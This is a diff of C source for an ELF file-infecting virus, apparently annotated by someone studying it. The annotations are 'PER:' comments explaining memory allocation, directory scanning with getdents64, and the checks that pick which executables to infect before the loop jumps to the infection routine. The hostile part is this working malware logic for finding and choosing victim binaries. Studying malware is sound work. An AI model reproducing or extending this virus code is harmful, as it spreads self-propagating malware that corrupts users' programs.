@@ -120,7 +120,7 @@ struct bootstrap_data {
 
 // PER: Structure of the ELF executable
 typedef struct elfbin {
-	Elf64_Ehdr *ehdr;
+	Elf64_Ehdr *ehdr; // 64 bytes
 	Elf64_Phdr *phdr;
 	Elf64_Shdr *shdr;
 	Elf64_Dyn *dyn;
@@ -260,8 +260,12 @@ normal:
 #define CHUNK_SIZE 256
 void * vx_malloc(size_t len, uint8_t **mem)
 {
+	// PER: len=filename+directory_name+2
+	// PER: mem contains the address that contains a NULL pointer
 	if (*mem == NULL) {
 		*mem = _mmap(NULL, 0x200000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+		//PER: **mem may be read and written, PROT_READ means protection-read, etc
+		
 		if (*mem == MAP_FAILED) {
 			DEBUG_PRINT("malloc failed with mmap\n");
 			Exit(-1);
@@ -305,7 +309,15 @@ static inline char * randomly_select_dir(char **dirs)
 
 char * full_path(char *exe, char *dir, uint8_t **heap)
 {
+	// PER: exe is the filename
+	// PER: dir contains the directory name/location
+	// PER: heap is contains the address that contains a NULL pointer
+	
 	char *ptr = (char *)vx_malloc(_strlen(exe) + _strlen(dir) + 2, heap);
+	// PER: ptr contains the (address returned by malloc + 256 -(len(exec) + len(dir)+2)
+	// `2` is for NULL ending of exe and dir
+	// PER: vx_malloc also sets the variable `heap` to (address returned by malloc + 256)
+
 	Memset(ptr, 0, _strlen(exe) + _strlen(dir));
 	_memcpy(ptr, dir, _strlen(dir));
 	ptr[_strlen(dir)] = '/';
@@ -697,7 +709,6 @@ int check_criteria(char *filename)
 	if (!dynamic) 
 		return -1;
 	return 0;
-
 }
 
 void do_main(struct bootstrap_data *bootstrap)
@@ -714,7 +725,7 @@ void do_main(struct bootstrap_data *bootstrap)
 	
 	int bpos, fcount, dd, nread;
 	
-	char *dir = NULL, **files, *fpath, dbuf[32768];
+	char *dir = NULL, **files, *fpath, dbuf[32768]; // PER: dbuf stores the directory entries (linux_dirent) in the directory
 	
 	struct stat st;
 	mode_t mode;
@@ -749,7 +760,7 @@ rescan:
 		scan_count = 1; // PER: if non-root user
 	DEBUG_PRINT("Infecting files in directory: %s\n", dir);
 	
-	dd = _open(dir, O_RDONLY | O_DIRECTORY, 0);
+	dd = _open(dir, O_RDONLY | O_DIRECTORY, 0); //PER: dd is a file descriptor
 
 	// PER: if open fails
 	if (dd < 0) {
@@ -758,25 +769,38 @@ rescan:
 	}
 	
 
-	load_self(&self);
+	load_self(&self); // PER: mem, size fields of this self elf file is filled
 	
 	for (;;) {
-		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 32768);
+		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 32768); //32768 is the size of dbuf
+		//PER: nread is the number of bytes read from the directory, `all files directly in a single dbuf buffer`
+
+		//PER: error
 		if (nread < 0) {
 			DEBUG_PRINT("getdents64 failed\n");
 			return;
 		}
+
+
 		if (nread == 0)
 			break;
 		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
+			//PER: It is ensured that atleast one healthy file(that passes the criteria) is infected
 			d = (struct linux_dirent64 *) (dbuf + bpos);
-    			bpos += d->d_reclen - 1;
+    		bpos += d->d_reclen - 1;
 			if (!_strcmp(d->d_name, VIRUS_LAUNCHER_NAME)) 
 				continue;
 			if (d->d_name[0] == '.')
 				continue;
+			// PER: fpath contains the address that point to {[dir]+[d->d_name]+[memory allocated my malloc]} 
+			// PER: all in the heap section of the process memory that is called by the full_path function.
+			
+			// PER: checking criteria
+			// 1. atleast one dynamic section
+			// 2. should be an x86_64 ET_EXEC elf file not already infected
+			// 3. size>=4096 bytes
 			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
-				continue; 
+				continue; //PER: criteria not matched, move on to next file in the directory 
 			if (icount == 0)
 				goto infect;
 			rnum = get_random_number(10);
